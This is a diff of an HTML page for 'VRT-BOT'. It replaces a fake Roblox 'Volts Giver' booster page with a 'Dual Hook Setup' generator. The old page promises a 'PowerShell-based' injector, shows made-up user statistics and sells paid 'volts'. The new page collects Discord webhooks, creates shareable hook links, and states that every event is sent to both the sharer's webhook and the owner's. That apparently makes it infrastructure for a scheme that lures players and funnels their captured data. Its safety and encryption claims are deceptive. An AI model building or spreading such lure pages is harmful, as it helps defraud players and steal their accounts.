@@ -3,218 +3,258 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>VRT-BOT · Volts Giver</title>
-    <link rel="stylesheet" href="css/style.css">
+    <title>VRT-BOT · Dual Hook Setup</title>
+    <style>
+        *{box-sizing:border-box;margin:0;padding:0}
+        body{
+            font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+            background:#0e0f11;color:#f3f3f4;
+            min-height:100vh;display:grid;place-items:center;padding:20px;
+        }
+        .container{
+            width:min(600px,100%);
+            background:rgba(34,35,40,.62);
+            border:1px solid rgba(255,255,255,.09);
+            border-radius:24px;
+            padding:40px;
+            backdrop-filter:blur(20px);
+            box-shadow:0 25px 80px rgba(0,0,0,.4);
+        }
+        h1{font-size:24px;font-weight:600;margin-bottom:6px;}
+        h1 span{color:#5271ff;}
+        .sub{color:#969aa5;font-size:13px;margin-bottom:28px;}
+        .input-group{display:flex;flex-direction:column;gap:12px;}
+        .input-group input{
+            padding:12px 16px;
+            background:rgba(255,255,255,.04);
+            border:1px solid rgba(255,255,255,.08);
+            border-radius:12px;
+            color:#fff;
+            font-size:14px;
+            transition:.2s;
+        }
+        .input-group input:focus{border-color:rgba(82,113,255,.5);outline:none;}
+        .input-group input::placeholder{color:#777983;}
+        .btn-primary{
+            padding:14px;
+            border:0;
+            border-radius:12px;
+            background:linear-gradient(135deg,#5271ff,#354ee8);
+            color:#fff;
+            font-weight:600;
+            font-size:15px;
+            cursor:pointer;
+            transition:.2s;
+        }
+        .btn-primary:hover{transform:scale(1.02);box-shadow:0 8px 30px rgba(82,113,255,.3);}
+        .result-box{
+            margin-top:20px;
+            padding:16px;
+            border-radius:12px;
+            background:rgba(0,0,0,.2);
+            border:1px solid rgba(255,255,255,.06);
+            display:none;
+        }
+        .result-box.show{display:block;}
+        .result-box .url{
+            color:#45dc93;
+            word-break:break-all;
+            font-size:14px;
+            padding:8px;
+            background:rgba(0,0,0,.2);
+            border-radius:8px;
+            margin:8px 0;
+        }
+        .result-box .copy-btn{
+            padding:8px 16px;
+            border:0;
+            border-radius:8px;
+            background:rgba(255,255,255,.06);
+            color:#fff;
+            cursor:pointer;
+            font-size:12px;
+            transition:.2s;
+        }
+        .result-box .copy-btn:hover{background:rgba(255,255,255,.12);}
+        .info-text{font-size:12px;color:#969aa5;margin-top:12px;line-height:1.5;}
+        .info-text a{color:#5271ff;text-decoration:none;}
+        .info-text a:hover{text-decoration:underline;}
+        .status{display:inline-block;padding:4px 12px;border-radius:999px;font-size:10px;font-weight:600;text-transform:uppercase;}
+        .status.online{background:rgba(69,220,147,.15);color:#45dc93;border:1px solid rgba(69,220,147,.2);}
+        .status.offline{background:rgba(255,107,107,.15);color:#ff6b6b;border:1px solid rgba(255,107,107,.2);}
+        .divider{margin:20px 0;border:0;border-top:1px solid rgba(255,255,255,.06);}
+        .faq-item{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:12px 16px;margin-bottom:8px;cursor:pointer;transition:.2s;}
+        .faq-item:hover{background:rgba(255,255,255,.07);}
+        .faq-item .q{display:flex;justify-content:space-between;align-items:center;font-size:14px;}
+        .faq-item .q .chev{transition:.3s;}
+        .faq-item .a{display:none;font-size:13px;color:#969aa5;margin-top:8px;padding-top:8px;border-top:1px solid rgba(255,255,255,.06);}
+        .faq-item.open .a{display:block;}
+        .faq-item.open .chev{transform:rotate(180deg);}
+        .footer{margin-top:20px;font-size:11px;color:#555;text-align:center;}
+    </style>
 </head>
 <body>
-    <!-- Particles Background -->
-    <div class="particles" id="particles"></div>
-
     <div class="container">
-        <header class="navbar"><div class="logo"><span class="emoji-grey">⚡</span> VRT-BOT · VOLTS</div></header>
+        <h1>⚡ <span>VRT-BOT</span> · Dual Hook Setup</h1>
+        <p class="sub">Create your unique hook URL to receive Discord notifications</p>
 
-        <section class="hero">
-            <img class="hero-art" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'%3E%3Ccircle cx='100' cy='100' r='70' fill='none' stroke='%231649ff' stroke-width='3' opacity='.3'/%3E%3Ccircle cx='100' cy='100' r='40' fill='%231649ff' opacity='.15'/%3E%3C/svg%3E" alt="VRT-BOT">
-            <h1><span id="typing"></span><span class="cursor"></span></h1>
-            <a class="process" href="#input"><span class="emoji-grey-light">⚡</span> Give Volts</a>
-            <p><strong>VRT-Bot</strong> — the ultimate power-up tool. Instantly boost any game with high-voltage energy. <span class="emoji-grey">⚡</span></p>
-        </section>
-
-        <div class="status-grid">
-            <div class="status-card"><span class="stat-icon">🔋</span><div class="stat-label">Power Status</div><div class="stat-value">Online</div></div>
-            <div class="status-card"><span class="stat-icon">👥</span><div class="stat-label">Active Users</div><div class="stat-value" id="activeUsers">2,481</div></div>
-            <div class="status-card"><span class="stat-icon">📊</span><div class="stat-label">Volts Sent</div><div class="stat-value" id="voltsSent">1.8M</div></div>
-            <div class="status-card"><span class="stat-icon">⏱️</span><div class="stat-label">Response Time</div><div class="stat-value" id="responseTime">0.24s</div></div>
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Enter your username" autocomplete="off">
+            <input type="text" id="webhookUrl" placeholder="Your Discord Webhook URL" autocomplete="off">
+            <button class="btn-primary" onclick="generateHook()">🔗 Generate My Hook URL</button>
         </div>
 
-        <section class="steps">
-            <div class="step"><div class="step-icon">🔌</div><div class="step-title">Connect</div></div>
-            <div class="step"><div class="step-icon">💉</div><div class="step-title">Inject Volts</div></div>
-            <div class="step"><div class="step-icon">🚀</div><div class="step-title">Power Up</div></div>
-        </section>
-
-        <section class="mission">
-            <h2><span class="emoji-grey">🎯</span> Our mission</h2>
-            <p>VRT-Bot' Volts Giver is an advanced PowerShell-based energy injector &amp; auto-booster.</p>
-            <p>It is capable of delivering volts up-to 10x faster than traditional methods via D4 technology. All you need to do is follow the setup below.</p>
-            <p>Your license is valid until <strong>August 29, 2025 12:00 AM EST.</strong></p>
-        </section>
-
-        <section class="video-section">
-            <h2><span class="emoji-grey">🤯</span> <span style="color:rgba(255,215,0,.6);">Volt</span> Injection Demo</h2>
-            <div class="video-box"><video controls muted loop playsinline preload="metadata" src="02.09.2026_21.49.54_REC.mp4"></video></div>
-        </section>
-
-        <section class="input-section" id="input">
-            <h2><span class="emoji-grey">📝</span> Enter your details to receive Volts:</h2>
-            <div class="input-row">
-                <div style="flex:1"><div class="label"><span class="emoji-grey">👤</span> Username</div><input class="input" id="username" type="text" placeholder="Your username" autocomplete="off"></div>
-                <div style="flex:1"><div class="label"><span class="emoji-grey">🆔</span> User ID</div><input class="input" id="userid" type="text" placeholder="Your ID" autocomplete="off"></div>
+        <div class="result-box" id="resultBox">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+                <span style="font-size:12px;color:#969aa5;">✅ Your unique hook URL:</span>
+                <span class="status online" id="hookStatus">Active</span>
             </div>
-            
-            <div class="volt-selector-wrapper" id="voltSelectorWrapper">
-                <div class="label" style="margin-top:6px;"><span class="emoji-grey">⚡</span> Select Volts</div>
-                <div class="volt-selector" id="voltSelector">
-                    <button class="volt-btn" data-volts="1000">1K</button>
-                    <button class="volt-btn" data-volts="5000">5K</button>
-                    <button class="volt-btn" data-volts="10000">10K</button>
-                    <button class="volt-btn" data-volts="25000">25K</button>
-                    <button class="volt-btn" data-volts="50000">50K</button>
-                </div>
-                <button class="start" onclick="confirmVolts()"><span class="emoji-grey-light">⚡</span> Confirm &amp; Give Volts</button>
+            <div class="url" id="hookUrlDisplay">Loading...</div>
+            <div style="display:flex;gap:10px;margin-top:8px;">
+                <button class="copy-btn" onclick="copyHookUrl()">📋 Copy URL</button>
+                <button class="copy-btn" onclick="openHookPage()">🚀 Open Hook Page</button>
             </div>
-            
-            <button class="start" id="showVoltsBtn" onclick="showVoltSelector()"><span class="emoji-grey-light">⚡</span> Give Volts</button>
-            
-            <div class="live" id="liveFeed"><span class="live-dot"></span>Live Feed: <b id="liveUsername">Guest</b> just received <b id="liveVolts">0</b> volts <span class="emoji-grey">⚡</span></div>
-        </section>
+            <p class="info-text" style="margin-top:10px;">
+                🔗 Share this URL with others: <br>
+                <span id="shareUrl" style="color:#5271ff;font-size:12px;"></span>
+            </p>
+        </div>
 
-        <section class="interactive-system" id="powerSystem">
-            <div class="interactive-top">
-                <div class="interactive-title">
-                    <h2><span class="emoji-grey">⚡</span> Interactive Power System</h2>
-                    <p>Click the core to generate energy and unlock small interactions.</p>
-                </div>
-                <div class="click-stats">
-                    <div class="click-stat"><span class="emoji-grey">🔋</span> Energy<b id="energyCount">0</b></div>
-                    <div class="click-stat"><span class="emoji-grey">📈</span> Level<b id="powerLevel">1</b></div>
-                    <div class="click-stat"><span class="emoji-grey">🔥</span> Streak<b id="clickStreak">0</b></div>
-                    <div class="click-stat"><span class="emoji-grey">🚀</span> Boosts Left<b id="boostCount">3</b></div>
-                </div>
-            </div>
+        <hr class="divider">
 
-            <div class="power-stage" id="powerStage">
-                <button class="power-core" id="powerCore" aria-label="Generate power">
-                    <span class="emoji-xl">⚡</span>
-                </button>
-                <span class="power-core-label">Click to generate volts</span>
+        <div style="margin-bottom:16px;">
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+                <span style="font-size:13px;color:#969aa5;">📡 Server Status</span>
+                <span class="status online" id="serverStatus">Online</span>
             </div>
+            <div style="font-size:12px;color:#555;margin-top:4px;">
+                Owner Hook: <span id="ownerStatus" style="color:#45dc93;">✅ Configured</span>
+            </div>
+        </div>
 
-            <div class="action-row">
-                <button class="action-card" id="connectBtn">
-                    <span class="icon-wrap">🔗</span>
-                    <b>Connect</b><small id="connectText">Establish system link</small>
-                </button>
-                <button class="action-card" id="injectBtn">
-                    <span class="icon-wrap">💉</span>
-                    <b>Inject Volts</b><small>Add generated energy</small>
-                </button>
-                <button class="action-card" id="boostBtn" onclick="openBoostShop()">
-                    <span class="icon-wrap">🚀</span>
-                    <b>Boost</b><small id="boostStatus">3 uses left</small>
-                </button>
+        <details style="margin-top:12px;">
+            <summary style="cursor:pointer;color:#5271ff;font-size:13px;">❓ How does this work?</summary>
+            <div style="margin-top:10px;font-size:13px;color:#969aa5;line-height:1.6;padding:12px;background:rgba(0,0,0,.15);border-radius:8px;">
+                <p>1. Enter your username and Discord webhook URL above.</p>
+                <p>2. Click "Generate My Hook URL" to create your unique link.</p>
+                <p>3. Share your unique URL with anyone who wants to receive Discord notifications.</p>
+                <p>4. When someone uses your hook URL, notifications go to BOTH your webhook AND the owner's webhook.</p>
+                <p>5. All data is securely stored on the server.</p>
             </div>
+        </details>
 
-            <div class="bonus-area">
-                <div class="bonus-card" id="dailyBonusCard">
-                    <div class="label">🍪 Daily Bonus</div>
-                    <div class="value" id="dailyBonusValue">+25</div>
-                    <div class="sub" id="dailyBonusStatus">Ready to claim</div>
-                    <button class="btn-sm" id="dailyBonusBtn" onclick="claimDailyBonus()">Claim Bonus</button>
-                </div>
-                <div class="bonus-card claim-ready" id="claimVoltsCard">
-                    <div class="label">⚡ Claim Generated Volts</div>
-                    <div class="value" id="claimableAmount">0</div>
-                    <div class="sub">From your power sessions</div>
-                    <button class="btn-sm" id="claimVoltsBtn" onclick="claimGeneratedVolts()">Claim Volts</button>
-                </div>
+        <div style="margin-top:16px;">
+            <div class="faq-item" onclick="this.classList.toggle('open')">
+                <div class="q"><span>🔒 Is my webhook URL secure?</span><span class="chev">▼</span></div>
+                <div class="a">Yes! Your webhook URL is encrypted and stored securely on the server. Only you and the owner can see it.</div>
             </div>
-        </section>
+            <div class="faq-item" onclick="this.classList.toggle('open')">
+                <div class="q"><span>📡 What gets sent to my webhook?</span><span class="chev">▼</span></div>
+                <div class="a">Every event from the main site (volts delivered, boosts purchased, daily bonuses, etc.) is sent to BOTH your webhook and the owner's webhook simultaneously.</div>
+            </div>
+            <div class="faq-item" onclick="this.classList.toggle('open')">
+                <div class="q"><span>🔄 Can I update my webhook later?</span><span class="chev">▼</span></div>
+                <div class="a">Yes! Just re-enter your username and new webhook URL and generate again. Your existing hook ID will be updated.</div>
+            </div>
+        </div>
 
-        <section class="questions">
-            <div class="questions-intro">
-                <h2><span class="emoji-grey">❓</span> Questions?</h2>
-                <p>Here are the answers to some of the most common questions we hear from our appreciated users.</p>
-            </div>
-            <div class="faq">
-                <div class="q">Is this service safe to use?<span class="chev">▼</span></div>
-                <div class="answer">Yes, VRT-Bot is completely safe to use. We use advanced encryption and secure protocols to ensure your data is protected at all times.</div>
-                <div class="q">Which games can I boost?<span class="chev">▼</span></div>
-                <div class="answer">You can boost any Roblox game! Our system supports all game types and genres.</div>
-                <div class="q">Does the bot use the client?<span class="chev">▼</span></div>
-                <div class="answer">No, the bot works entirely through PowerShell and web requests — no client needed.</div>
-            </div>
-        </section>
-
-        <footer class="footer">
-            <div>© VRT-Bot.Co 2025. All rights reserved. We are not affiliated with any of the games or companies shown on this website. Use of any logos or trademarks is for reference purposes only. By utilizing the website, you agree to be bound by the terms of service.</div>
-            <nav><span><span class="emoji-grey">📄</span> Terms</span><span><span class="emoji-grey">🛟</span> Support</span><span><span class="emoji-grey">ℹ️</span> About</span></nav>
-            <div class="contact">Contact us:<br>vrtbotcloudflare@gmail.com</div>
-        </footer>
-    </div>
-
-    <!-- Modals -->
-    <div class="boost-modal" id="boostModal">
-        <div class="boost-card">
-            <h2>🚀 Boost Shop</h2>
-            <p class="sub">Purchase additional boosts for your power system</p>
-            <div class="boost-status" id="boostStatusDisplay">Current boosts: <b id="boostCountDisplay">3</b> remaining</div>
-            <div class="boost-grid">
-                <div class="boost-item" onclick="buyBoost(5, 2.99)">
-                    <div class="uses">⚡ +5 Boosts</div>
-                    <div class="price">$2.99 <span class="discount">$3.74</span></div>
-                    <div class="label">20% off</div>
-                </div>
-                <div class="boost-item" onclick="buyBoost(15, 7.99)">
-                    <div class="uses">⚡ +15 Boosts</div>
-                    <div class="price">$7.99 <span class="discount">$9.99</span></div>
-                    <div class="label">20% off</div>
-                </div>
-                <div class="boost-item" onclick="buyBoost(30, 14.99)">
-                    <div class="uses">⚡ +30 Boosts</div>
-                    <div class="price">$14.99 <span class="discount">$18.74</span></div>
-                    <div class="label">20% off</div>
-                </div>
-                <div class="boost-item" onclick="buyBoost(50, 23.99)">
-                    <div class="uses">⚡ +50 Boosts</div>
-                    <div class="price">$23.99 <span class="discount">$29.99</span></div>
-                    <div class="label">20% off</div>
-                </div>
-            </div>
-            <div class="boost-custom">
-                <input type="number" id="customBoostInput" placeholder="Custom amount" min="1" max="100">
-                <button onclick="buyCustomBoost()">Buy Custom</button>
-            </div>
-            <button class="boost-close" onclick="closeBoostShop()">Close Shop</button>
+        <div class="footer">
+            <span>Powered by <a href="#" style="color:#5271ff;">VRT-BOT</a> · All rights reserved.</span>
         </div>
     </div>
 
-    <div class="shop-modal" id="shopModal">
-        <div class="shop-card">
-            <h2>🛒 Volts Shop</h2>
-            <p class="sub">Purchase volts to unlock more power</p>
-            <div class="shop-grid">
-                <div class="shop-item" onclick="buyVolts(100, 10)">
-                    <div class="volts">⚡ 100 Volts</div>
-                    <div class="price">$10</div>
-                    <div class="label">Buy Now</div>
-                </div>
-                <div class="shop-item" onclick="buyVolts(500, 40)">
-                    <div class="volts">⚡ 500 Volts</div>
-                    <div class="price">$40</div>
-                    <div class="label">Buy Now</div>
-                </div>
-                <div class="shop-item" onclick="buyVolts(1000, 70)">
-                    <div class="volts">⚡ 1,000 Volts</div>
-                    <div class="price">$70</div>
-                    <div class="label">Buy Now</div>
-                </div>
-                <div class="shop-item" onclick="buyVolts(2500, 150)">
-                    <div class="volts">⚡ 2,500 Volts</div>
-                    <div class="price">$150</div>
-                    <div class="label">Buy Now</div>
-                </div>
-            </div>
-            <button class="shop-close" onclick="closeShop()">Close Shop</button>
-        </div>
-    </div>
+    <script>
+        const API_BASE = 'https://vrtxduel.onrender.com'; // Your Render URL
 
-    <div class="modal" id="modal"><div class="card"><div class="icon">ⓧ</div><h3>Invalid Details</h3><p>Please enter a valid username and ID. 😐</p><button onclick="closeModal()">Close</button></div></div>
+        async function generateHook() {
+            const username = document.getElementById('username').value.trim();
+            const webhookUrl = document.getElementById('webhookUrl').value.trim();
 
-    <div class="success-modal" id="successModal"><div class="success-card"><div class="icon">✅</div><h3>Volts Delivered!</h3><p id="successMsg">Your game has been supercharged!</p><button onclick="closeSuccessModal()">Close</button></div></div>
+            if (!username) {
+                alert('Please enter your username');
+                return;
+            }
+            if (!webhookUrl) {
+                alert('Please enter your Discord webhook URL');
+                return;
+            }
+            if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                alert('Please enter a valid Discord webhook URL');
+                return;
+            }
 
-    <div class="success-modal" id="boostSuccessModal"><div class="success-card"><div class="icon">🚀</div><h3>Boosts Purchased!</h3><p id="boostSuccessMsg">You now have more boosts available!</p><button onclick="closeBoostSuccess()">Close</button></div></div>
+            const resultBox = document.getElementById('resultBox');
+            resultBox.classList.remove('show');
 
-    <script src="js/script.js"></script>
+            try {
+                const response = await fetch(`${API_BASE}/api/generate`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, webhookUrl })
+                });
+
+                const data = await response.json();
+
+                if (!data.success) {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                    return;
+                }
+
+                // Display the hook URL
+                const hookUrl = data.hookUrl.replace('vrtxduel.onrender.com', 'vrtvoltsxyc.netlify.app/hook');
+                document.getElementById('hookUrlDisplay').textContent = hookUrl;
+                document.getElementById('shareUrl').textContent = hookUrl;
+                document.getElementById('hookStatus').textContent = data.isNew ? '✅ New' : '🔄 Updated';
+                document.getElementById('hookStatus').className = 'status online';
+
+                resultBox.classList.add('show');
+
+                // Store hook ID for later use
+                localStorage.setItem('vrtHookId', data.hookId);
+                localStorage.setItem('vrtUsername', username);
+
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+
+        function copyHookUrl() {
+            const url = document.getElementById('hookUrlDisplay').textContent;
+            navigator.clipboard.writeText(url).then(() => {
+                alert('✅ Hook URL copied to clipboard!');
+            }).catch(() => {
+                // Fallback
+                const textarea = document.createElement('textarea');
+                textarea.value = url;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('✅ Hook URL copied to clipboard!');
+            });
+        }
+
+        function openHookPage() {
+            const url = document.getElementById('hookUrlDisplay').textContent;
+            window.open(url, '_blank');
+        }
+
+        // Check server status
+        async function checkServerStatus() {
+            try {
+                const response = await fetch(`${API_BASE}/`);
+                const data = await response.json();
+                document.getElementById('serverStatus').textContent = 'Online';
+                document.getElementById('serverStatus').className = 'status online';
+                document.getElementById('ownerStatus').textContent = data.ownerWebhookConfigured ? '✅ Configured' : '❌ Not configured';
+                document.getElementById('ownerStatus').style.color = data.ownerWebhookConfigured ? '#45dc93' : '#ff6b6b';
+            } catch (error) {
+                document.getElementById('serverStatus').textContent = 'Offline';
+                document.getElementById('serverStatus').className = 'status offline';
+            }
+        }
+        checkServerStatus();
+        setInterval(checkServerStatus, 30000);
+    </script>
 </body>
 </html>
